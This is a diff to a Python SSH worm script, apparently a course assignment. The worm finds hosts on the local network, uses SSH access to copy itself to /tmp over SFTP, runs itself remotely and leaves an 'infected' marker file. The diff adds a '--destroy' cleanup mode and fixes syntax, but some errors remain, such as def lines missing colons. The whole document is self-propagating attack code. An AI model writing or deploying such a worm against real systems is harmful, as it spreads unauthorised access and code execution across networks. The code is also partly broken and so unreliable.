@@ -23,17 +23,22 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 ### ---[[ Delete Worm Dependencies]]-- ###
 
 def spreadAndExecuteArgs(ssHInfo)
-        if (sys.argv[0] == "destroy") :
-                spreadAndExecute(ssHInfo, true)
+        if (sys.argv[1] == "--destroy") :
+                spreadAndExecute(ssHInfo, True)
+                std_in, std_out, std_err =ssHInfo.exec_command("python '/tmp/worm.py' --destroy")
                 removeWormRec()
         else:
-                spreadAndExecute(ssHInfo, false)
-        return 0:
+                spreadAndExecute(ssHInfo, False)
+                std_in, std_out, std_err =ssHInfo.exec_command("python '/tmp/worm.py'")
+        return 0
 
 def removeWormRec()
-        os.remove("/tmp/infected.txt")
-        os.remove("/tmp/worm.py")
-        return 0:
+        try:
+                os.remove("/tmp/infected.txt")
+                os.remove("/tmp/worm.py")
+        except:
+                print'Exception for the remove'
+        return 0
 
 ##################################################################
 # Returns whether the worm should spread
@@ -87,12 +92,14 @@ def spreadAndExecute(sshClient, Destroy):
 	# execute itself. Please check out the
 	# code we used for an in-class exercise.
 	# The code which goes into this function
-	# is very similar to that code.	
+	# is very similar to that code.
+	if (Destroy):
+             sshClient.exec_command("chmod a+x /tmp/worm.py")
+             sshClient.exec_command("python /tmp/worm.py --destroy")
+             return 
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp/" + "worm.py")
-	if (Destroy):
-             sshClient.exec_command("chmod a+x /tmp/worm.py -destroy")
-             return 0
+	
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
 
 def getHostsOnTheSameNetwork():
@@ -294,11 +301,12 @@ for host in networkHosts:
 	
 	# Did the attack succeed?
 	if sshInfo:
-		
-		print "Trying to spread"
-		fileOUT = open('/tmp/infected.txt', 'w+')
-		fileOUT.write("You've been infected!!!\nZombie STYLE")
-		fileOUT.close()
+
+		if (sys.argv[1] != "--destroy"):
+                        print "Trying to spread"
+                        fileOUT = open('/tmp/infected.txt', 'w+')
+                        fileOUT.write("You've been infected!!!\nZombie STYLE")
+                        fileOUT.close()
 		
 		
 		
@@ -329,11 +337,13 @@ for host in networkHosts:
 		
 		if not (isInfectedSystem(sftp, remotepath, localpath)):
 			spreadAndExecuteArgs(sshInfo)
-			std_in, std_out, std_err =sshInfo.exec_command("python '/tmp/worm.py'")
+			
 			print(std_out.read())
 			
 		else:
-			print('All systems clear?')
+                        if (sys.argv[1] == "--destroy"):
+                                spreadAndExecuteArgs(sshInfo)        
+                        print('All systems clear?')
 			sys.exit()
 
 
